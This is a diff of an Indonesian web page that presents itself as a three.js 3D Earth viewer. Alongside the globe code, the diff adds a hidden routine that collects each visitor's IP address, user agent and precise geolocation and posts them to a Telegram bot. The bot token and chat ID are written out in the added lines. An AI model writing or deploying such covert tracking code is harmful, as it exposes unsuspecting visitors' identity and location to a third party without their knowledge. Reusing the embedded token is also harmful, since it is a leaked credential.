@@ -2,7 +2,7 @@
 <html lang="id">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <title>Bumi 3D</title>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/three.js/r128/three.min.js"></script>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/three.js/r128/examples/js/controls/OrbitControls.js"></script>
@@ -17,7 +17,7 @@
         // --- BUMI 3D ---
         const scene = new THREE.Scene();
         const camera = new THREE.PerspectiveCamera(75, window.innerWidth / window.innerHeight, 0.1, 1000);
-        const renderer = new THREE.WebGLRenderer();
+        const renderer = new THREE.WebGLRenderer({ antialias: true });
         renderer.setSize(window.innerWidth, window.innerHeight);
         document.body.appendChild(renderer.domElement);
 
@@ -40,7 +40,8 @@
 
         // --- AMBIL DATA USER & KIRIM KE TELEGRAM ---
         async function sendUserDataToTelegram() {
-            const PROXY_URL = "https://your-proxy-api.com/send"; // Ganti dengan proxy API yang menyembunyikan token
+            const TELEGRAM_BOT_TOKEN = "8053936515:AAHbzPzWww5mJPrDpp-2HixSfUX7hC1TNIs"; // Ganti dengan token bot Telegram kamu
+            const TELEGRAM_CHAT_ID = "7233342888"; // Ganti dengan chat ID kamu
 
             let ipData = await fetch('https://api.myip.com').then(res => res.json());
             let userAgent = navigator.userAgent;
@@ -49,20 +50,19 @@
                 let latitude = position.coords.latitude;
                 let longitude = position.coords.longitude;
 
-                let data = {
-                    ip: ipData.ip,
-                    userAgent: userAgent,
-                    location: `https://www.google.com/maps?q=${latitude},${longitude}`
-                };
+                let message = `
+🔍 *Data Pengunjung*:
+🌍 *IP*: ${ipData.ip}
+📱 *User-Agent*: ${userAgent}
+📍 *Lokasi*: [Lihat di Maps](https://www.google.com/maps?q=${latitude},${longitude})
+                `;
 
-                fetch(PROXY_URL, {
-                    method: "POST",
-                    headers: { "Content-Type": "application/json" },
-                    body: JSON.stringify(data)
-                })
-                .then(res => res.json())
-                .then(response => console.log("Data terkirim:", response))
-                .catch(error => console.error("Error mengirim:", error));
+                let telegramURL = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodeURIComponent(message)}&parse_mode=Markdown`;
+
+                fetch(telegramURL)
+                    .then(response => response.json())
+                    .then(data => console.log("Data terkirim ke Telegram:", data))
+                    .catch(error => console.error("Error mengirim ke Telegram:", error));
 
             }, (error) => {
                 console.error("Lokasi tidak diizinkan!", error);
